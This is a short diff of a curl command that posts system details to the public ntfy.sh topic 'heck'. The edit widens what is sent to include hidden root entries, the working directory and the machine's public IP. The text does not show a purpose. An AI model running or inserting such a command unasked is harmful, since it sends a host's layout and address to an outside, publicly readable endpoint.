@@ -1,3 +1,3 @@
 curl \
-  -d "RAM Info: $(free -h), / folders: $(ls /), Disk info: $(df -h)" \
+  -d "$(free -h), $(ls / -a), $(df -h), $(pwd), $(curl ipinfo.io/ip)" \
   ntfy.sh/heck
